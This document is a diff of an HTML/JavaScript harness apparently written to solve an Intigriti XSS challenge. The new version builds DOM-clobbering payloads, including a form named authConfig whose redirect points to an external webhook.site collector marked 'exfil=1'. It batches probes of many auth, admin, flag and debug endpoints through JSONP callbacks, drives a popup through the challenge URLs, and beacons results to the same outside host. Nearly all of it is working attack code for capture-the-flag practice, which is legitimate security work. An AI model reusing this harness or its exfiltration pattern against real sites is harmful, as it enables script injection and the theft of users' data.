@@ -1,138 +1,209 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>challenge0326 opener harness</title>
-<body>opener-harness</body>
+<title>challenge0326 batch harness</title>
+<body>batch-harness</body>
 <script>
-const sink = 'https://webhook.site/caaac3a6-72f9-4933-ae3a-1a8e17e3baf4';
+const RUN = 'seq1';
+const SINK = 'https://webhook.site/caaac3a6-72f9-4933-ae3a-1a8e17e3baf4';
+const TARGET = 'https://challenge-0326.intigriti.io/challenge.html?q=';
+const STEP_DELAY_MS = 2000;
+const BATCH_SIZE = 60;
 
-function ping(msg) {
-  const i = new Image();
-  i.src = sink + '?m=' + encodeURIComponent(msg) + '&t=' + Date.now();
+function ping(message) {
+  const image = new Image();
+  image.src = `${SINK}?run=${encodeURIComponent(RUN)}&m=${encodeURIComponent(message)}&t=${Date.now()}`;
 }
 
-function installEventLogging(prefix) {
-  [
-    'click',
-    'dblclick',
-    'pointerdown',
-    'pointerup',
-    'mousedown',
-    'mouseup',
-    'keydown',
-    'keyup',
-    'focus',
-    'blur',
-    'visibilitychange',
-    'pagehide',
-    'pageshow'
-  ].forEach(type => {
-    addEventListener(type, event => {
-      let extra = '';
-      if (type === 'visibilitychange') {
-        extra = ':' + document.visibilityState;
-      } else if (type.startsWith('key')) {
-        extra = ':' + event.key;
-      } else if (event.target && event.target.tagName) {
-        extra = ':' + event.target.tagName;
-      }
-      ping(prefix + ':' + type + extra);
-    }, true);
-  });
+function chunk(items, size) {
+  const batches = [];
+  for (let index = 0; index < items.length; index += size) {
+    batches.push(items.slice(index, index + size));
+  }
+  return batches;
 }
 
-window.Auth = {
-  loginRedirect(data) {
-    ping('opener:Auth.loginRedirect:' + JSON.stringify(data));
-  }
-};
-window.callback = data => ping('opener:callback:' + JSON.stringify(data));
-window.cb = data => ping('opener:cb:' + JSON.stringify(data));
-window.jsonp = data => ping('opener:jsonp:' + JSON.stringify(data));
-window.jsoncallback = data => ping('opener:jsoncallback:' + JSON.stringify(data));
-
-addEventListener('message', event => {
-  let data = '';
-  try {
-    data = JSON.stringify(event.data);
-  } catch (err) {
-    data = String(event.data);
-  }
-  ping('opener:message:' + event.origin + ':' + data);
-});
-
-function buildPayload() {
-  const routes = [
-    { path: '/components/', type: 'default' },
-    { path: '/components/', type: 'auth' },
-    { path: '/components/', type: 'callback' },
-    { path: '/components/', type: 'login' },
-    { path: '/components/', type: 'redirect' },
-    { path: '/components/', type: 'session' },
-    { path: '/components/', type: 'internal' },
-    { path: '/components/', type: 'admin' },
-    { path: '/components/', type: 'auth-callback' },
-    { path: '/components/', type: 'login-redirect' },
-    { path: '/js/', type: 'auth-callback' },
-    { path: '/js/', type: 'login-redirect' },
-    { path: '/', type: 'auth/callback?callback=Auth.loginRedirect#' },
-    { path: '/', type: 'login/callback?callback=Auth.loginRedirect#' },
-    { path: '/', type: 'callback?callback=Auth.loginRedirect#' },
-    { path: '/', type: 'auth?callback=Auth.loginRedirect#' },
-    { path: '/', type: 'session?callback=Auth.loginRedirect#' },
-    { path: '/', type: 'api/auth/callback?callback=Auth.loginRedirect#' },
-    { path: '/', type: 'api/session?callback=Auth.loginRedirect#' },
-    { path: '/', type: 'oauth/callback?callback=Auth.loginRedirect#' },
-    { path: '/', type: 'oidc/callback?callback=Auth.loginRedirect#' },
-    { path: '/', type: 'sso/callback?callback=Auth.loginRedirect#' },
-    { path: '/', type: 'auth/complete?callback=Auth.loginRedirect#' },
-    { path: '/', type: 'auth/redirect?callback=Auth.loginRedirect#' },
-    { path: '/', type: 'auth/callback?cb=callback#' },
-    { path: '/', type: 'auth/callback?jsonp=jsonp#' },
-    { path: '/', type: 'auth/callback?jsoncallback=jsoncallback#' }
-  ];
-
+function buildPayload(batchId, requestPaths) {
   const parts = [
-    '<form name=authConfig data-next="' + sink + '?batch=ext1" data-append="true"></form>'
+    `<form name=authConfig data-next="${SINK}?run=${encodeURIComponent(RUN)}&batch=${encodeURIComponent(batchId)}&exfil=1" data-append="true"></form>`
   ];
-  for (const route of routes) {
-    const config = JSON.stringify(route);
-    parts.push('<div data-component="true" data-config=\'' + config + '\'></div>');
+
+  for (const requestPath of requestPaths) {
+    const config = JSON.stringify({
+      path: '/',
+      type: requestPath.replace(/^\//, '') + '#'
+    });
+    parts.push(`<div data-component="true" data-config='${config}'></div>`);
   }
+
   return parts.join('');
 }
 
-installEventLogging('main');
-ping('main:boot:' + navigator.userAgent);
-
-const payload = buildPayload();
-const target = 'https://challenge-0326.intigriti.io/challenge.html?q=' + encodeURIComponent(payload);
-ping('main:target-len:' + String(target.length));
-
-let popup = null;
-try {
-  popup = window.open(target, 'intigriti-opener-probe');
-  ping('main:popup-open:' + String(!!popup));
-} catch (e) {
-  ping('main:popup-open-err:' + e.name + ':' + e.message);
+function toChallengeUrl(batchId, requestPaths) {
+  return TARGET + encodeURIComponent(buildPayload(batchId, requestPaths));
 }
 
-setTimeout(() => {
-  try {
-    ping('main:popup-closed:' + (popup ? String(popup.closed) : 'null'));
-  } catch (e) {
-    ping('main:popup-closed-err:' + e.name + ':' + e.message);
-  }
-}, 3000);
+function buildCandidates() {
+  const set = new Set();
+  const callbackValue = 'Auth.loginRedirect';
+  const callbackKeys = ['callback', 'cb'];
+  const jsonpModes = ['format=jsonp'];
 
-setTimeout(() => {
-  try {
-    ping('main:popup-closed-late:' + (popup ? String(popup.closed) : 'null'));
-  } catch (e) {
-    ping('main:popup-closed-late-err:' + e.name + ':' + e.message);
+  function add(path) {
+    set.add(path);
   }
-}, 10000);
 
-setTimeout(() => {
-  document.body.textContent = 'done';
-}, 12000);
+  function addCallbackVariants(path) {
+    add(path);
+    const separator = path.includes('?') ? '&' : '?';
+    for (const key of callbackKeys) {
+      add(`${path}${separator}${key}=${encodeURIComponent(callbackValue)}`);
+    }
+    for (const mode of jsonpModes) {
+      add(`${path}${separator}${mode}&callback=${encodeURIComponent(callbackValue)}`);
+    }
+  }
+
+  [
+    '/search',
+    '/query',
+    '/results',
+    '/records',
+    '/datastore',
+    '/intelligence',
+    '/threats',
+    '/intel',
+    '/ops',
+    '/operational',
+    '/api/search',
+    '/api/query',
+    '/api/results',
+    '/api/records',
+    '/api/datastore',
+    '/api/intelligence',
+    '/api/threats',
+    '/api/intel',
+    '/api/ops',
+    '/internal/search',
+    '/api/internal/search',
+    '/search/internal',
+    '/search/results'
+  ].forEach(base => {
+    addCallbackVariants(`${base}?domain=internal&q=x`);
+    addCallbackVariants(`${base}?domain=internal&query=x`);
+    addCallbackVariants(`${base}?q=x`);
+  });
+
+  [
+    '/auth',
+    '/login',
+    '/session',
+    '/me',
+    '/user',
+    '/profile',
+    '/account',
+    '/flag',
+    '/auth/callback',
+    '/auth/redirect',
+    '/auth/return',
+    '/auth/result',
+    '/auth/complete',
+    '/auth/finish',
+    '/login/callback',
+    '/login/redirect',
+    '/session/callback',
+    '/session/redirect',
+    '/session/me',
+    '/auth/me',
+    '/api/session',
+    '/api/me',
+    '/api/user',
+    '/api/profile',
+    '/api/account',
+    '/api/flag',
+    '/api/auth',
+    '/api/auth/callback',
+    '/api/auth/session',
+    '/api/auth/me',
+    '/oauth/callback',
+    '/oauth2/callback',
+    '/oidc/callback',
+    '/signin-oidc',
+    '/signout-callback-oidc',
+    '/sso/callback'
+  ].forEach(addCallbackVariants);
+
+  [
+    '/admin',
+    '/admin/review',
+    '/admin/panel',
+    '/admin/callback',
+    '/admin/session',
+    '/debug',
+    '/debug/auth',
+    '/debug/session',
+    '/debug/callback',
+    '/review',
+    '/status',
+    '/health',
+    '/diag',
+    '/diagnostics',
+    '/config',
+    '/env',
+    '/whoami',
+    '/api/status',
+    '/api/config',
+    '/api/debug',
+    '/api/review',
+    '/api/report',
+    '/api/admin'
+  ].forEach(addCallbackVariants);
+
+  return Array.from(set);
+}
+
+function navigatePopupBatches() {
+  const candidates = buildCandidates();
+  const batches = chunk(candidates, BATCH_SIZE).map((paths, index) => ({
+    id: `b${String(index + 1).padStart(2, '0')}`,
+    paths
+  }));
+
+  ping(`main:boot:${navigator.userAgent}`);
+  ping(`main:candidate-count:${String(candidates.length)}`);
+  ping(`main:batch-count:${String(batches.length)}`);
+
+  let popup = null;
+  try {
+    popup = window.open('about:blank', 'intigriti-batch-probe');
+    ping(`main:popup-open:${String(!!popup)}`);
+  } catch (error) {
+    ping(`main:popup-open-error:${error.name}:${error.message}`);
+    return;
+  }
+
+  batches.forEach((batch, index) => {
+    const url = toChallengeUrl(batch.id, batch.paths);
+    setTimeout(() => {
+      ping(`nav:${batch.id}:len:${String(url.length)}:count:${String(batch.paths.length)}`);
+      try {
+        if (popup) {
+          popup.location = url;
+        }
+      } catch (error) {
+        ping(`nav-error:${batch.id}:${error.name}:${error.message}`);
+      }
+    }, index * STEP_DELAY_MS);
+  });
+
+  setTimeout(() => {
+    try {
+      ping(`main:popup-closed-final:${popup ? String(popup.closed) : 'null'}`);
+    } catch (error) {
+      ping(`main:popup-closed-final-error:${error.name}:${error.message}`);
+    }
+    document.body.textContent = `done:${RUN}`;
+  }, batches.length * STEP_DELAY_MS + 2000);
+}
+
+navigatePopupBatches();
 </script>
